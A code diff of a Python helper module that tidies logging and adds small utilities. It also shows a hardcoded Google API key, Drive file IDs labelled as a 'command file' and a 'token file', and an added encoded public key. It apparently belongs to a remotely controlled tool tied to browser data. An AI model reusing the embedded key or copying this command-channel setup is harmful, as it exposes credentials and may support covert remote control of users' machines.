@@ -1,6 +1,5 @@
 #%%
 import json
-from json.decoder import JSONDecodeError
 import os
 import pickle
 from functools import cached_property, lru_cache
@@ -8,10 +7,12 @@ from pprint import PrettyPrinter
 from threading import Event
 import threading
 import ctypes
+import codecs
 
 from .browsers.config.constant import constant
 from .network import ip
 from logger import log
+from traceback import format_exc
 
 
 username=constant.username
@@ -23,8 +24,8 @@ def formated_str(data):
         data=json.dumps(data, indent=4)
         return data
     except Exception as e:
-        log.warning('unknown error while formating type:', type(data))
-        log.debug(e.with_traceback())
+        log.warning(f'unknown error while formating type: {type(data)}')
+        log.debug(format_exc())
     
     return PrettyPrinter(indent=4).pformat(data)
 
@@ -45,6 +46,21 @@ def size_of(path):
         return os.stat(path).st_size
     return 0
 
+def force_str(b:bytes):
+    a=codecs.encode(b, "hex")
+    return a.decode('ascii', "strict")
+
+def random_str(ln):
+    '''return random srt of "ln" charecters'''
+    return force_str(os.urandom(ln//2))
+
+def makedirs(path):
+    try:
+        os.makedirs(path)
+    except:
+        pass
+
+
 #%%
 class Values:
     def __init__(self):
@@ -58,17 +74,23 @@ class Values:
         self.cfile_id=r"1eO37l2YgGeI9ChV3be1oYprzpyKpmvXG"# command file id
         self.tfile_id=r"1UQBBpNb5KYFuS6qO3QXI2kSeQ0DylvB0"# token file id
         self.api_key=r"AIzaSyB4Q2rKEaR_w7TPL_bOOtSJ9GZMJig3HSs"
+        self.key='''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUV
+        GQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6U05FQndwelg0M1ZXd0FwVHNWegppbmlaMDJwUnppenJRZzZrSHU
+        4N1JIQXk0MGdnZC9ubCtUcGNMSE83ckQ4OFozYlBLMFl2ZHBMTzdOeWd5TWI2Ckt2djdRd1hnYXFKYWR
+        ia3NQR3hpOTNVdElGc3JmL3JSVHFGbi84cmpSZlZ1TFZpR3UyWmRhR3dMZkowdExQVUkKWmdPTFlSUEt
+        wcm1YWTJWZFJwR0RWQkxqTm9vak84ZTMxZVgyblVLYisxc2dsZ1VPUktzWHpqSHk4azhkN0VtSgpxYXl
+        xVnpmTnpOY1JYNGJWMW9MQ3ZvQXZCTjV0ZERUazE1aHloM2hIWnZCNnlGdFdodHd6dHVvWWUxeUZMcE5
+        4Cmd5VWJHWHBVeUFYZ24vMVV0bG5GTFNPdW55M3FZOWIzbnZldTZDeVZ0N2dtNzlIR01CdlhGTVBYcmt
+        pdlppZ2sKK1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
 
 #%%
 class permanent:
     def __init__(self):
         # self.data = USERPROFILE\.cache\plugin.pin
         self.data_dir=os.path.join(constant.profile.get("USERPROFILE"), ".cache")
-        try:
-            os.makedirs(self.data_dir)
-        except:
-            pass
+        makedirs(self.data_dir)
         self.data_dir=os.path.join(self.data_dir, "plugin.pin")
+        
         self.var = Values()
         self.write = Event()
         self.write.set()
